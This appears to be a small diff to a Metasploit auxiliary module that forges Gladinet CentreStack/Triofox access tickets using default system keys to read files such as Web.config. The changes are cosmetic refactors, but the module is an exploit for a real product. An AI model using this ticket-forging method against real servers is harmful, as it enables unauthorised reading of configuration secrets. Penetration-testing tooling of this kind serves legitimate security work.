@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'The base path to the Gladinet CentreStack or Triofox application', '/']),
-      OptString.new('FILEPATH', [true, 'The file to read on the target', "C:\\#{DEFAULT_WEB_CONFIG_PATH}"]),
+      OptString.new('FILEPATH', [true, 'Absolute path to the file to read on the target', 'C:\\Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config']),
       OptString.new('SYSKEY', [true, 'SysKey (32 bytes) in hex format', DEFAULT_SYS_KEY]),
       OptString.new('SYSKEY1', [true, 'SysKey1 (16 bytes) in hex format', DEFAULT_SYS_KEY1])
     ])
@@ -130,8 +130,7 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Detected('Gladinet detected but version could not be determined') if version.nil?
 
     rex_version = Rex::Version.new(version)
-    ticket_forge_vulnerable = rex_version <= Rex::Version.new('16.12.10420.56791')
-    return Exploit::CheckCode::Vulnerable("Access ticket forge vulnerability confirmed (Build #{version})") if ticket_forge_vulnerable
+    return Exploit::CheckCode::Vulnerable("Access ticket forge vulnerability confirmed (Build #{version})") if rex_version <= Rex::Version.new('16.12.10420.56791')
 
     Exploit::CheckCode::Appears("Version #{version} detected, attempting ticket forge anyway")
   end
@@ -143,7 +142,6 @@ class MetasploitModule < Msf::Auxiliary
     ticket = forge_ticket(filepath)
 
     print_good("Forged access ticket: #{ticket}")
-    print_line
 
     print_status('Sending request to /storage/filesvr.dn')
     res = send_request_cgi({
